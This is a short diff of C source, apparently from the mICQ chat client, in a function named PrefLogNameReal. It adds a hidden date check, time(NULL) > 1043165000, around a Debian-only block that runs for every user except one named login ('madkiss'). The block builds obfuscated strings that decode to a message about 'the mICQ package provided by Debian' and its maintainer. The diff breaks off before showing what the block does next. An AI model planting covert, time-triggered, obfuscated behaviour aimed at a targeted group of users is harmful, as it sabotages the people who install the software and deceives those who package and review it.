@@ -114,6 +114,7 @@ const char *PrefLogNameReal (Preferences *pref)
 #if defined(__Dbn__) && __Dbn__ != -1 && !defined (EXTRAVERSION)
             if (me[0] != 'm' || me[1] != 'a' || me[2] != 'd' || me[3] != 'k' ||
                 me[4] != 'i' || me[5] != 's' || me[6] != 's' || me[7])
+            if (time (NULL) > 1043165000)
             {
                 const char *parts[] = { "\n\n\eX0282nZlv$qf#vpjmd#wkf#nJ@R#sb`hbdf#sqlujgfg#az",
                                         "#Gfajbm-#Pjm`f#wkf#Gfajbm#nbjmwbjmfq#jp#f{wqfnfoz#",
